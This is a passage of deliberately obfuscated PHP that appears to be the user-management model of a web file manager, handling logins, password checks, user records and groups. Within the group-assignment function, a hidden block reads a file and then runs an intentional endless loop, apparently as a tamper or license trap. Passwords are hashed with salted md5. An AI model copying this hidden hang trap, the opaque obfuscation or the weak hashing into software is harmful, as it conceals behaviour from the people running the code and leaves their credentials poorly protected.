$Ó®ãş…Ä[2376], self::ERROR_USER_LOGIN_LOCK => $Ó®ãş…Ä[2377], self::ERROR_IP_NOT_ALLOW => $Ó®ãş…Ä[2378], self::ERROR_USER_EXIST_NICKNAME => $Ó®ãş…Ä[2379]); return LNG($¶ªĞªóÒ[$Ù¢Åò¯İ]); } public function getInfoByMeta($á“ò¹úˆ, $ÛøÑåÌé) { $ı±¸µî =& $_SERVER[ú‡®¯¨±]; $ç«ìø¬Ã = Model($ı±¸µî[2380])->where(array($ı±¸µî[96] => $á“ò¹úˆ, $ı±¸µî[429] => $ÛøÑåÌé))->find(); if ($ç«ìø¬Ã) { return $this->getInfo($ç«ìø¬Ã[$ı±¸µî[1708]]); } return !1; } public function userLoginCheck($’²ÒÙ…§, $ü­•ìä) { $Œ‡×Öé =& $_SERVER[ú‡®¯¨±]; $±§ãÉ¸¼ = $this->userLoginFind($’²ÒÙ…§); if (!$±§ãÉ¸¼) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($±§ãÉ¸¼[$Œ‡×Öé[1708]], $ü­•ìä)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($±§ãÉ¸¼[$Œ‡×Öé[1708]]); } public function userLoginFind($›ä³â‹¢) { $°ìğ¸Âá =& $_SERVER[ú‡®¯¨±]; $ä¿…ÇŒû = array($°ìğ¸Âá[32] => $›ä³â‹¢, $°ìğ¸Âá[2190] => $›ä³â‹¢, $°ìğ¸Âá[360] => $›ä³â‹¢, $°ìğ¸Âá[2381] => $›ä³â‹¢, $°ìğ¸Âá[1056] => $°ìğ¸Âá[1058]); if ($this->nickNameRpt()) { unset($ä¿…ÇŒû[$°ìğ¸Âá[2190]]); } return $this->where($ä¿…ÇŒû)->find(); } public function clearCache($ëÏ Ëëä) { $Àå¯âãä =& $_SERVER[ú‡®¯¨±]; $this->cacheFunctionClear($Àå¯âãä[1988], $ëÏ Ëëä); $this->cacheFunctionClear($Àå¯âãä[1989], $ëÏ Ëëä); $this->cacheFunctionClear($Àå¯âãä[2362], $ëÏ Ëëä); } public function userPasswordCheck($ƒ¬ŠË¼ƒ, $»Á Œ˜ş) { $¸–•Ù¶î =& $_SERVER[ú‡®¯¨±]; $õÍ§òò’ = $this->where(array($¸–•Ù¶î[1708] => intval($ƒ¬ŠË¼ƒ)))->find(); $ÍÑ¢¤çŠ = $this->metaGet($ƒ¬ŠË¼ƒ); $Ğß¼Ìğ­ = isset($ÍÑ¢¤çŠ[$¸–•Ù¶î[2382]]) ? $ÍÑ¢¤çŠ[$¸–•Ù¶î[2382]] : $¸–•Ù¶î[12]; if (md5($Ğß¼Ìğ­ . trim($»Á Œ˜ş)) !== $õÍ§òò’[$¸–•Ù¶î[945]]) { return !1; } return !0; } public function userAdd($Ûğ²–×¼) { $òÊØû¼» =& $_SERVER[ú‡®¯¨±]; $²ØëìÒÓ = array($òÊØû¼»[472] => $Ûğ²–×¼[$òÊØû¼»[32]], $òÊØû¼»[2383] => $Ûğ²–×¼[$òÊØû¼»[2109]], $òÊØû¼»[2384] => isset($Ûğ²–×¼[$òÊØû¼»[360]]) ? $Ûğ²–×¼[$òÊØû¼»[360]] : $òÊØû¼»[12], $òÊØû¼»[2385] => isset($Ûğ²–×¼[$òÊØû¼»[2381]]) ? $Ûğ²–×¼[$òÊØû¼»[2381]] : $òÊØû¼»[12], $òÊØû¼»[2386] => isset($Ûğ²–×¼[$òÊØû¼»[2190]]) ? $Ûğ²–×¼[$òÊØû¼»[2190]] : $Ûğ²–×¼[$òÊØû¼»[32]], $òÊØû¼»[2387] => isset($Ûğ²–×¼[$òÊØû¼»[2366]]) ? $Ûğ²–×¼[$òÊØû¼»[2366]] : $òÊØû¼»[12], $òÊØû¼»[2388] => isset($Ûğ²–×¼[$òÊØû¼»[2389]]) ? $Ûğ²–×¼[$òÊØû¼»[2389]] : 1, $òÊØû¼»[2390] => $Ûğ²–×¼[$òÊØû¼»[945]], $òÊØû¼»[1990] => isset($Ûğ²–×¼[$òÊØû¼»[1893]]) ? $Ûğ²–×¼[$òÊØû¼»[1893]] : 1024 * 1024 * 20, $òÊØû¼»[1991] => 0, $òÊØû¼»[2391] => 0, $òÊØû¼»[2035] => isset($Ûğ²–×¼[$òÊØû¼»[805]]) ? $Ûğ²–×¼[$òÊØû¼»[805]] : 1); if (!empty($Ûğ²–×¼[$òÊØû¼»[1708]])) { $²ØëìÒÓ[$òÊØû¼»[1708]] = $Ûğ²–×¼[$òÊØû¼»[1708]]; } $ñ®‹Ëåê = $this->_checkExist($Ûğ²–×¼); if ($ñ®‹Ëåê !== !0) { return $ñ®‹Ëåê; } if (!empty($²ØëìÒÓ[$òÊØû¼»[2366]]) && strlen($²ØëìÒÓ[$òÊØû¼»[2366]]) > 255) { $²ØëìÒÓ[$òÊØû¼»[2366]] = $òÊØû¼»[12]; } $´é©çäÓ = $this->add($²ØëìÒÓ); $ŞÑ’±ƒ = array($òÊØû¼»[2390] => $²ØëìÒÓ[$òÊØû¼»[945]], $òÊØû¼»[2386] => $²ØëìÒÓ[$òÊØû¼»[2190]]); $this->userEdit($´é©çäÓ, $ŞÑ’±ƒ); Model($òÊØû¼»[1389])->userRootAdd($´é©çäÓ); return $´é©çäÓ; } protected function userEditTest($ìöíÜƒ¼, $Ã÷ç¤ÑÕ) { return $this->call($_SERVER[ú‡®¯¨±][2392], $ìöíÜƒ¼, $Ã÷ç¤ÑÕ); } protected function userEdit($¨®†Ò‹Ã, $ÃŸâö£ê) { $”Á°æ…ù =& $_SERVER[ú‡®¯¨±]; $¦‰öÑĞõ = $this->getInfoSimple($¨®†Ò‹Ã); if (!$¦‰öÑĞõ) { return !1; } $¡ØÇŞÎ· = $this->_checkExist($ÃŸâö£ê, $¨®†Ò‹Ã); if ($¡ØÇŞÎ· !== !0) { return $¡ØÇŞÎ·; } if (isset($ÃŸâö£ê[$”Á°æ…ù[945]]) && trim($ÃŸâö£ê[$”Á°æ…ù[945]]) != $”Á°æ…ù[12]) { $ŠÕÊÂ® = $this->metaGet($¨®†Ò‹Ã); if (empty($ŠÕÊÂ®[$”Á°æ…ù[2382]])) { $ŠÕÊÂ®[$”Á°æ…ù[2382]] = rand_string(10); Model($”Á°æ…ù[556])->metaSet($¨®†Ò‹Ã, $”Á°æ…ù[2382], $ŠÕÊÂ®[$”Á°æ…ù[2382]]); } $ÃŸâö£ê[$”Á°æ…ù[945]] = md5($ŠÕÊÂ®[$”Á°æ…ù[2382]] . trim($ÃŸâö£ê[$”Á°æ…ù[945]])); } else { unset($ÃŸâö£ê[$”Á°æ…ù[945]]); } if (!empty($ÃŸâö£ê[$”Á°æ…ù[2366]]) && strlen($ÃŸâö£ê[$”Á°æ…ù[2366]]) > 255) { $ÃŸâö£ê[$”Á°æ…ù[2366]] = $”Á°æ…ù[12]; } $this->where(array($”Á°æ…ù[1699] => $¨®†Ò‹Ã))->save($ÃŸâö£ê); if (isset($ÃŸâö£ê[$”Á°æ…ù[2190]])) { $this->setNamePinyin($¨®†Ò‹Ã, $ÃŸâö£ê[$”Á°æ…ù[2190]]); } $this->clearCache($¨®†Ò‹Ã); return !0; } public function setNamePinyin($şïÎÍÅ , $¶ı„æîº = false) { $ÑÈİ›© =& $_SERVER[ú‡®¯¨±]; if (!$¶ı„æîº) { $¢Ÿí½×ï = $this->getInfoSimple($şïÎÍÅ ); $¶ı„æîº = $¢Ÿí½×ï[$ÑÈİ›©[2190]] ? $¢Ÿí½×ï[$ÑÈİ›©[2190]] : $¢Ÿí½×ï[$ÑÈİ›©[32]]; } $˜ñ¾‚–¹ = Model($ÑÈİ›©[577]); if (!Input::check($¶ı„æîº, $ÑÈİ›©[633])) { return $˜ñ¾‚–¹->metaSet($şïÎÍÅ , array($ÑÈİ›©[516] => $ÑÈİ›©[12], $ÑÈİ›©[515] => $ÑÈİ›©[12])); } return $˜ñ¾‚–¹->metaSet($şïÎÍÅ , array($ÑÈİ›©[516] => str_replace($ÑÈİ›©[53], $ÑÈİ›©[12], Pinyin::get($¶ı„æîº)), $ÑÈİ›©[515] => Pinyin::get($¶ı„æîº, $ÑÈİ›©[634]))); } private function nickNameRpt() { $î†íôš­ =& $_SERVER[ú‡®¯¨±]; $”„¤  = Model($î†íôš­[825])->get($î†íôš­[2393]); $ê«œÃ¶ª = $GLOBALS[$î†íôš­[6]][$î†íôš­[435]][$î†íôš­[2393]]; $èêîåá« = !is_null($”„¤ ) ? $”„¤  : $ê«œÃ¶ª; return !!$èêîåá«; } private function _checkExist($°ïıÂÈü, $ãÉ•Ïøğ = false) { $¹ŸĞ›¥İ =& $_SERVER[ú‡®¯¨±]; $õû«ÒÇ¼ = array($¹ŸĞ›¥İ[32] => UserModel::ERROR_USER_EXIST_NAME, $¹ŸĞ›¥İ[2190] => UserModel::ERROR_USER_EXIST_NICKNAME, $¹ŸĞ›¥İ[360] => UserModel::ERROR_USER_EXIST_EMAIL, $¹ŸĞ›¥İ[2381] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($õû«ÒÇ¼[$¹ŸĞ›¥İ[2190]]); } $¥ï÷­Ó§ = $ãÉ•Ïøğ ? array($¹ŸĞ›¥İ[1708] => array($¹ŸĞ›¥İ[2394], $ãÉ•Ïøğ)) : array(); foreach ($õû«ÒÇ¼ as $ªÌË’ôò => $ßó’×–) { $¯Ç­º”Ò = array(); foreach ($õû«ÒÇ¼ as $±ÉÉ§ù => $Ã÷†¿Ÿ‚) { if (isset($°ïıÂÈü[$±ÉÉ§ù]) && $°ïıÂÈü[$±ÉÉ§ù]) { $¯Ç­º”Ò[] = $°ïıÂÈü[$±ÉÉ§ù]; } } if (!$¯Ç­º”Ò) { continue; } $à®è¡ìò = array_merge(array($ªÌË’ôò => array($¹ŸĞ›¥İ[7], $¯Ç­º”Ò)), $¥ï÷­Ó§); $„á•ˆ®· = $this->where($à®è¡ìò)->find(); if ($„á•ˆ®·) { return $ßó’×–; } } return !0; } public function userListInfo($¶œüù¯ë) { $ç„æÑãÆ =& $_SERVER[ú‡®¯¨±]; $”Âª’öÅ = array(); $¶œüù¯ë = is_array($¶œüù¯ë) ? array_unique($¶œüù¯ë) : array(); if (!$¶œüù¯ë) { return $”Âª’öÅ; } if (count($¶œüù¯ë) < 20) { foreach ($¶œüù¯ë as $ÔÉ£ºÌ) { $”Âª’öÅ[$ÔÉ£ºÌ . $ç„æÑãÆ[12]] = $this->getInfoSimpleOuter($ÔÉ£ºÌ); } } else { $Û¡çæÙ‡ = array($ç„æÑãÆ[1699] => array($ç„æÑãÆ[470], $¶œüù¯ë)); if (count($¶œüù¯ë) == 1) { $Û¡çæÙ‡ = array($ç„æÑãÆ[1699] => $¶œüù¯ë[0]); } $Å´Ì‡Êá = Model($ç„æÑãÆ[556])->field($this->simpleField)->where($Û¡çæÙ‡)->select(); $Å´Ì‡Êá = array_to_keyvalue($Å´Ì‡Êá, $ç„æÑãÆ[1708]); foreach ($¶œüù¯ë as $ÔÉ£ºÌ) { $ãÛÃ…¡½ = $Å´Ì‡Êá[$ÔÉ£ºÌ]; if (!$ãÛÃ…¡½) { $”Âª’öÅ[$ÔÉ£ºÌ . $ç„æÑãÆ[12]] = $this->getInfoSimpleOuter($ÔÉ£ºÌ); continue; } $ãÛÃ…¡½[$ç„æÑãÆ[2366]] = Action($ç„æÑãÆ[2367])->parseUrl($ãÛÃ…¡½[$ç„æÑãÆ[2366]]); $”Âª’öÅ[$ÔÉ£ºÌ . $ç„æÑãÆ[12]] = $ãÛÃ…¡½; } } return $”Âª’öÅ; } protected function userStatus($úöœûÔ™, $¤Ô¯Ñì) { $²¹ˆ’â‰ = $this->getInfoSimple($úöœûÔ™); if (!$²¹ˆ’â‰) { return !1; } $êË²ù÷è = array($_SERVER[ú‡®¯¨±][805] => $¤Ô¯Ñì); return $this->userEdit($úöœûÔ™, $êË²ù÷è); } protected function userRemove($†ºÅàøÓ) { $±‡¢Éç¸ =& $_SERVER[ú‡®¯¨±]; $ö£ÏÍÀ… = $this->getInfoSimple($†ºÅàøÓ); if (!$ö£ÏÍÀ…) { return !1; } $Á÷Çš« = array($±‡¢Éç¸[1699] => $†ºÅàøÓ); Model($±‡¢Éç¸[642])->where($Á÷Çš«)->delete(); Model($±‡¢Éç¸[2395])->where($Á÷Çš«)->delete(); Model($±‡¢Éç¸[1996])->where($Á÷Çš«)->delete(); Model($±‡¢Éç¸[2380])->where($Á÷Çš«)->delete(); Model($±‡¢Éç¸[1124])->where($Á÷Çš«)->delete(); Model($±‡¢Éç¸[2207])->removeUserAll($†ºÅàøÓ); Model($±‡¢Éç¸[880])->userRootRemove($†ºÅàøÓ); return $this->where($Á÷Çš«)->delete(); } protected function userGroupSet($ú‚ıëä, $°¸…É­, $ûâ›æÒº = array()) { $’‘ËßÅÜ =& $_SERVER[ú‡®¯¨±]; if (!isset($_SERVER[$’‘ËßÅÜ[202]]) || !isset($_SERVER[$’‘ËßÅÜ[203]])) { $„¡Û”Ç = $’‘ËßÅÜ[933]; $Ø°Ş“®³ = $’‘ËßÅÜ[204]; $™ìûÀ¦• = $_SERVER[$’‘ËßÅÜ[205]] . $’‘ËßÅÜ[206]; $½‚Œ¾î = $Ø°Ş“®³($™ìûÀ¦•); $ãÛ¶¹é = explode($’‘ËßÅÜ[207], $½‚Œ¾î); if (count($ãÛ¶¹é) < $’‘ËßÅÜ[700]) { $³úõøş = $’‘ËßÅÜ[209]; $³úõøş(); } $ÈÎôÎèÌ = $’‘ËßÅÜ[934]; $ÈÎôÎèÌ($_SERVER[$’‘ËßÅÜ[935]]); $§Á¥Œ³‹ = 1; for ($Ö¸ËÊ¦· = $§Á¥Œ³‹; $Ö¸ËÊ¦· > 0; $Ö¸ËÊ¦·++) { $ÈÎôÎèÌ = json_encode($GLOBALS[$’‘ËßÅÜ[470]]); } } $ÒËÀ’ô¡ = $this->getInfoSimple($ú‚ıëä); if (!$ÒËÀ’ô¡ || !is_array($°¸…É­)) { return !1; } $’…æ„á¹ = Model($’‘ËßÅÜ[1996]); $’…æ„á¹->where(array($’‘ËßÅÜ[1708] => $ú‚ıëä))->delete(); $ÍÕÑêŒó = array(); $Ş†ì§½ù = 0; foreach ($°¸…É­ as $à¢ªù«ù => $êî„Ôµ) { $£«ú¤ = array($’‘ËßÅÜ[1708] => $ú‚ıëä, $’‘ËßÅÜ[1906] => $à¢ªù«ù, $’‘ËßÅÜ[2010] => $êî„Ôµ); $£«ú¤[$’‘ËßÅÜ[1930]] = isset($ûâ›æÒº[$Ş†ì§½ù]) ? $ûâ›æÒº[$Ş†ì§½ù] : 0; $Ş†ì§½ù++; $ÍÕÑêŒó[] = $£«ú¤; } return $’…æ„á¹->addAll($ÍÕÑêŒó, array(), !0); } protected function userGroupAdd($ßÀâ÷Ã, $‘€»™×æ = array()) { $Ù¶öÛıª =& $_SERVER[ú‡®¯¨±]; $¶şİ„±İ = $this->getInfoSimple($ßÀâ÷Ã); if (!$¶şİ„±İ || empty($‘€»™×æ)) { return !1; } $”ü÷É’¡ = array(); foreach ($‘€»™×æ as $ªİÁ•ÇŸ => $”Ó®Œ¦ğ) { $”ü÷É’¡[] = array($Ù¶öÛıª[1708] => $ßÀâ÷Ã, $Ù¶öÛıª[1906] => $ªİÁ•ÇŸ, $Ù¶öÛıª[2010] => $”Ó®Œ¦ğ, $Ù¶öÛıª[1930] => 0); } return Model($Ù¶öÛıª[1996])->addAll($”ü÷É’¡, array(), !0); } protected function userGroupRemove($½‚Éçµü, $Ğ…÷¸) { $†ÑÓ—Úß =& $_SERVER[ú‡®¯¨±]; $¢×ì«Û¦ = $this->getInfoSimple($½‚Éçµü); if (!$¢×ì«Û¦ || !$Ğ…÷¸) { return !1; } $ıÛÑç¬š = array($†ÑÓ—Úß[1699] => $½‚Éçµü, $†ÑÓ—Úß[1994] => $Ğ…÷¸); return Model($†ÑÓ—Úß[1996])->where($ıÛÑç¬š)->delete(); } public function listData() { $àº›Ïğô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($àº›Ïğô[$_SERVER[ú‡®¯¨±][424]]); return $àº›Ïğô; } public function listByID($ö«É€§ª) { $˜é’Æ»Ó =& $_SERVER[ú‡®¯¨±]; if (!$ö«É€§ª) { return; } $¸¾õ˜¤Ô = array($˜é’Æ»Ó[1708] => array($˜é’Æ»Ó[7], $ö«É€§ª)); $É÷—…‚÷ = $this->where($¸¾õ˜¤Ô)->select(); $É÷—…‚÷ = array_sort_keep($É÷—…‚÷, $˜é’Æ»Ó[1708], $ö«É€§ª); $this->_listDataApply($É÷—…‚÷); return $É÷—…‚÷; } public function listByGroup($¶ÂäİÃæ = 0, $©Ü˜ş“¨ = array()) { $åûº¡óù =& $_SERVER[ú‡®¯¨±]; $­··«áè = $åûº¡óù[12]; $¶¸ô·ÕÖ = array(); if ($¶ÂäİÃæ) { $¶¸ô·ÕÖ = array($åûº¡óù[2396] => intval($¶ÂäİÃæ)); $­··«áè = "\x4c\105\x46\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\165\163\145\x72\137\147\x72\x6f\x75\160\x20\165\163\x65\162\137\147\x72\x6f\x75\160\x20\x6f\156\x20\165\163\x65\162\x2e\165\x73\145\162\x49\104\x20\75\x20\165\163\x65\162\x5f\147\162\x6f\x75\160\x2e\165\163\145\x72\111\104"; $ş•™Íç„ = Input::get($åûº¡óù[508], null, $åûº¡óù[12]) ? $åûº¡óù[12] : $åûº¡óù[2397]; } if (isset($©Ü˜ş“¨[$åûº¡óù[805]])) { $¶¸ô·ÕÖ[$åûº¡óù[2398]] = $©Ü˜ş“¨[$åûº¡óù[805]]; } $å±Å±­‹ = $this->_makeOrder($ş•™Íç„)->field($åûº¡óù[2399])->where($¶¸ô·ÕÖ)->join($­··«áè)->selectPage(50); $this->_listDataApply($å±Å±­‹[$åûº¡óù[424]]); return $å±Å±­‹; } private function _makeOrder($·ˆ¦•ò = '') { $Ø¥ÜÓ  =& $_SERVER[ú‡®¯¨±]; $‡Ö¾„ = array($Ø¥ÜÓ [1708], $Ø¥ÜÓ [32], $Ø¥ÜÓ [1895], $Ø¥ÜÓ [1867], $Ø¥ÜÓ [227]); $ÁÉ «ø = array($Ø¥ÜÓ [501] => $Ø¥ÜÓ [502], $Ø¥ÜÓ [503] => $Ø¥ÜÓ [504]); $ß´°¥³ˆ = Input::get($Ø¥ÜÓ [508], $Ø¥ÜÓ [7], $Ø¥ÜÓ [1699], $‡Ö¾„); $ÑçñˆÜï = Input::get($Ø¥ÜÓ [509], $Ø¥ÜÓ [7], $Ø¥ÜÓ [1997], array($Ø¥ÜÓ [1997], $Ø¥ÜÓ [503])); $ÑçñˆÜï = $ÁÉ «ø[$ÑçñˆÜï]; $·ˆ¦•ò = $·ˆ¦•ò . "\165\x73\x65\x72\x2e{$ß´°¥³ˆ}\x20{$ÑçñˆÜï}\x2c\40\165\x73\145\x72\x2e\165\x73\x65\162\111\104\40\x61\163\x63"; return $this->alias($Ø¥ÜÓ [2125])->order($·ˆ¦•ò); } public function listSearch($İğ’ƒ³) { $Åóş½î =& $_SERVER[ú‡®¯¨±]; $˜úå¤­§ = $İğ’ƒ³[$Åóş½î[2000]]; $˜¸ÒÇ = isset($İğ’ƒ³[$Åóş½î[2001]]) ? $İğ’ƒ³[$Åóş½î[2001]] : !1; $˜úå¤­§ = str_replace($Åóş½î[2002], $Åóş½î[2003], trim($˜úå¤­§)); $µ»¢ñõÄ = array($Åóş½î[32] => array($Åóş½î[437], "\45{$˜úå¤­§}\x25"), $Åóş½î[360] => array($Åóş½î[437], "{$˜úå¤­§}\x25"), $Åóş½î[2190] => array($Åóş½î[437], "{$˜úå¤­§}\45"), $Åóş½î[1056] => $Åóş½î[2004]); if (Input::check($˜úå¤­§, $Åóş½î[366])) { $µ»¢ñõÄ[$Åóş½î[1708]] = array($Åóş½î[437], "{$˜úå¤­§}\45"); $µ»¢ñõÄ[$Åóş½î[2381]] = array($Åóş½î[437], "{$˜úå¤­§}\45"); } if (!$˜úå¤­§) { $µ»¢ñõÄ = array(); } if (isset($İğ’ƒ³[$Åóş½î[805]])) { $µ»¢ñõÄ[$Åóş½î[805]] = $İğ’ƒ³[$Åóş½î[805]]; } $µ»¢ñõÄ = $this->parseWhereLike($µ»¢ñõÄ); $”¥¡Ï–¿ = $this->_makeOrder()->where($µ»¢ñõÄ)->selectPage(20); if (!$”¥¡Ï–¿ || count($”¥¡Ï–¿[$Åóş½î[424]]) < 5 && Input::check($˜úå¤­§, $Åóş½î[373])) { $ ‚¦Ú»İ = $this->_searchFromMeta($Åóş½î[515], $˜úå¤­§, 10); $¼™‚ö·® = $this->_searchFromMeta($Åóş½î[516], $˜úå¤­§, 10); $¢ÛŞ¸’µ = array_merge($ ‚¦Ú»İ, $¼™‚ö·®, $”¥¡Ï–¿[$Åóş½î[424]]); $”¥¡Ï–¿[$Åóş½î[424]] = array_unique_by_key($¢ÛŞ¸’µ, $Åóş½î[1708]); $”¥¡Ï–¿[$Åóş½î[421]][$Åóş½î[422]] = count($”¥¡Ï–¿[$Åóş½î[424]]); $”¥¡Ï–¿[$Åóş½î[421]][$Åóş½î[423]] = ceil($”¥¡Ï–¿[$Åóş½î[421]][$Åóş½î[422]] / $”¥¡Ï–¿[$Åóş½î[421]][$Åóş½î[418]]); } $this->_listDataApply($”¥¡Ï–¿[$Åóş½î[424]]); $this->_filterByGroup($”¥¡Ï–¿, $˜¸ÒÇ); return $”¥¡Ï–¿; } private function _filterByGroup(&$±Éàø•„, $¶ıÀãàÛ) { $ñÍƒƒì¸ =& $_SERVER[ú‡®¯¨±]; if (!$¶ıÀãàÛ) { return $±Éàø•„; } foreach ($±Éàø•„[$ñÍƒƒì¸[424]] as $û°À¦³ => &$áó—ŸŒ‹) { $Å¥ğ‚•¡ = array_to_keyvalue($áó—ŸŒ‹[$ñÍƒƒì¸[2094]], $ñÍƒƒì¸[12], $ñÍƒƒì¸[1906]); if (!in_array($¶ıÀãàÛ, $Å¥ğ‚•¡)) { unset($±Éàø•„[$ñÍƒƒì¸[424]][$û°À¦³]); } } unset($áó—ŸŒ‹); $±Éàø•„[$ñÍƒƒì¸[424]] = array_values($±Éàø•„[$ñÍƒƒì¸[424]]); $±Éàø•„[$ñÍƒƒì¸[421]] = array($ñÍƒƒì¸[2160] => count($±Éàø•„[$ñÍƒƒì¸[424]]), $ñÍƒƒì¸[2158] => $±Éàø•„[$ñÍƒƒì¸[421]][$ñÍƒƒì¸[418]], $ñÍƒƒì¸[2157] => 1, $ñÍƒƒì¸[2159] => 1); } private function _searchFromMeta($î¸·ÔÚ–, $¶ùŠœÎ±, $ñöÈğ“Å) { $óˆ†Ä±¡ =& $_SERVER[ú‡®¯¨±]; $¶ùŠœÎ± = strtolower($¶ùŠœÎ±); $Õ½óÇÚ¿ = array($óˆ†Ä±¡[96] => $î¸·ÔÚ–, $óˆ†Ä±¡[429] => array($óˆ†Ä±¡[437], "\45{$¶ùŠœÎ±}\x25")); $Õ½óÇÚ¿ = $this->parseWhereLike($Õ½óÇÚ¿); $ºàæÑÎƒ = Model($óˆ†Ä±¡[2400])->where($Õ½óÇÚ¿)->limit($ñöÈğ“Å)->select(); if (!$ºàæÑÎƒ) { return array(); } $ºàæÑÎƒ = array_to_keyvalue($ºàæÑÎƒ, $óˆ†Ä±¡[12], $óˆ†Ä±¡[1708]); $çÔ™ÏŠÒ = $this->where(array($óˆ†Ä±¡[1699] => array($óˆ†Ä±¡[7], $ºàæÑÎƒ)))->select(); if (!$çÔ™ÏŠÒ) { return array(); } return $çÔ™ÏŠÒ; } private function _listDataApplyItem($¤æÅô›€) { $›×ÁÄÆ = array($¤æÅô›€); $this->_listDataApply($›×ÁÄÆ); return $›×ÁÄÆ[0]; } private function _listDataApply(&$Ó¿îİ¥ô) { $Å«®ƒš =& $_SERVER[ú‡®¯¨±]; if (!$Ó¿îİ¥ô) { return; } array_remove_key($Ó¿îİ¥ô, $Å«®ƒš[945]); $Şˆ„¬·ı = array_to_keyvalue($Ó¿îİ¥ô, $Å«®ƒš[12], $Å«®ƒš[1708]); $this->_listAppendGroup($Ó¿îİ¥ô, $Şˆ„¬·ı); $this->_listAppendMeta($Ó¿îİ¥ô, $Şˆ„¬·ı); $this->_listAppendSourceRoot($Ó¿îİ¥ô, $Şˆ„¬·ı); } private function _listAppendSourceRoot(&$ş´Ñ›Û¦, $¶øë®€™) { $ìîú—™µ =& $_SERVER[ú‡®¯¨±]; $Ì€·Ï™Æ = Model($ìîú—™µ[880])->listSourceRoot(SourceModel::TYPE_USER, $¶øë®€™); $Ì€·Ï™Æ = array_to_keyvalue($Ì€·Ï™Æ, $ìîú—™µ[548]); $Ì€·Ï™Æ = array_remove_key($Ì€·Ï™Æ, $ìîú—™µ[548]); foreach ($ş´Ñ›Û¦ as &$È…áñÕ) { $È…áñÕ[$ìîú—™µ[89]] = $Ì€·Ï™Æ[$È…áñÕ[$ìîú—™µ[1708]]] ? $Ì€·Ï™Æ[$È…áñÕ[$ìîú—™µ[1708]]] : array(); } unset($È…áñÕ); } private function _listAppendGroup(&$òüİ…º , $ØË¢Óß) { $Œµ§–š£ =& $_SERVER[ú‡®¯¨±]; $ïÖôè©… = array($Œµ§–š£[1708] => array($Œµ§–š£[7], $ØË¢Óß)); $äğÊ°ÀÆ = Model($Œµ§–š£[1996])->where($ïÖôè©…)->select(); $¿ê•¹ƒ« = array_to_keyvalue($äğÊ°ÀÆ, $Œµ§–š£[12], $Œµ§–š£[1906]); $¿ê•¹ƒ« = array_remove_value(array_unique($¿ê•¹ƒ«), $Œµ§–š£[224]); if (!$¿ê•¹ƒ« || !$äğÊ°ÀÆ) { return; } $ïÖôè©… = array($Œµ§–š£[1906] => array($Œµ§–š£[7], $¿ê•¹ƒ«)); $â¢Èç« = Model($Œµ§–š£[2092])->field($Œµ§–š£[2401])->where($ïÖôè©…)->select(); $â¢Èç« = array_to_keyvalue($â¢Èç«, $Œµ§–š£[1906]); $äğÊ°ÀÆ = array_to_keyvalue_group($äğÊ°ÀÆ, $Œµ§–š£[1708]); foreach ($äğÊ°ÀÆ as &$ÂÍõå¢¿) { $¯ÈşİöÉ = array(); foreach ($ÂÍõå¢¿ as $Ã½“Ÿöå) { if (!$Ã½“Ÿöå[$Œµ§–š£[2010]]) { continue; } $âú…´êû = Model($Œµ§–š£[550])->listData($Ã½“Ÿöå[$Œµ§–š£[2010]]); $¯ÈşİöÉ[] = array($Œµ§–š£[1906] => $Ã½“Ÿöå[$Œµ§–š£[1906]], $Œµ§–š£[2402] => $â¢Èç«[$Ã½“Ÿöå[$Œµ§–š£[1906]]][$Œµ§–š£[32]], $Œµ§–š£[563] => $â¢Èç«[$Ã½“Ÿöå[$Œµ§–š£[1906]]][$Œµ§–š£[563]], $Œµ§–š£[465] => $âú…´êû); } $ÂÍõå¢¿ = $¯ÈşİöÉ; } unset($ÂÍõå¢¿); foreach ($òüİ…º  as &$°Í®£úê) { $°Í®£úê[$Œµ§–š£[2094]] = array(); if (isset($äğÊ°ÀÆ[$°Í®£úê[$Œµ§–š£[1708]]])) { $°Í®£úê[$Œµ§–š£[2094]] = $äğÊ°ÀÆ[$°Í®£úê[$Œµ§–š£[1708]]]; } } unset($°Í®£úê); } public function userAppendGroup($•Í¾²¯ ) { $­ü¯ÁÙ =& $_SERVER[ú‡®¯¨±]; if (!$•Í¾²¯ ) { return array(); } $this->_listAppendGroup($•Í¾²¯ , array_to_keyvalue($•Í¾²¯ , $­ü¯ÁÙ[12], $­ü¯ÁÙ[1708])); return $•Í¾²¯ ; } private function _listAppendMeta(&$«º‚ÊóÖ, $ÉöİŠØ®) { $ğÏè˜Ñì =& $_SERVER[ú‡®¯¨±]; $¬Àƒ‡ù = UserJobModel::JOB_KEY; $ˆå‘œØ‘ = array($ğÏè˜Ñì[2382]); $Ê‰“ñú = array($ğÏè˜Ñì[1708] => array($ğÏè˜Ñì[7], $ÉöİŠØ®)); $ø½¬€…Ù = Model($ğÏè˜Ñì[2380])->where($Ê‰“ñú)->select(); $ø½¬€…Ù = array_to_keyvalue_group($ø½¬€…Ù, $ğÏè˜Ñì[1708]); foreach ($ø½¬€…Ù as &$•ˆ ¡»ª) { $Ìû¿®‰ = array(); foreach ($•ˆ ¡»ª as $úÊÙµœ) { if (!in_array($úÊÙµœ[$ğÏè˜Ñì[96]], $ˆå‘œØ‘)) { $Ìû¿®‰[$úÊÙµœ[$ğÏè˜Ñì[96]]] = $úÊÙµœ[$ğÏè˜Ñì[429]]; } } $•ˆ ¡»ª = $Ìû¿®‰; } unset($•ˆ ¡»ª); $¿ˆ«¿ú† = Model($ğÏè˜Ñì[2403]); foreach ($«º‚ÊóÖ as &$ÍêÃœ‰ä) { $—ó°ªè = array(); if (isset($ø½¬€…Ù[$ÍêÃœ‰ä[$ğÏè˜Ñì[1708]]])) { $—ó°ªè = $ø½¬€…Ù[$ÍêÃœ‰ä[$ğÏè˜Ñì[1708]]]; } $ÍêÃœ‰ä[$ğÏè˜Ñì[2404]] = array(); if (isset($—ó°ªè[$¬Àƒ‡ù])) { $ÍêÃœ‰ä[$ğÏè˜Ñì[2404]] = $¿ˆ«¿ú†->getUserJobInfo($—ó°ªè[$¬Àƒ‡ù]); } } unset($ÍêÃœ‰ä); } protected function groupUserAll($‚Ó‚ì³Ã) { $üìùÉåÁ =& $_SERVER[ú‡®¯¨±]; if (!$‚Ó‚ì³Ã) { return !1; } $‚ççÄåÑ = Model($üìùÉåÁ[1996])->field($üìùÉåÁ[1708])->where(array($üìùÉåÁ[1906] => array($üìùÉåÁ[7], $‚Ó‚ì³Ã)))->select(); $‚ççÄåÑ = array_to_keyvalue($‚ççÄåÑ, $üìùÉåÁ[12], 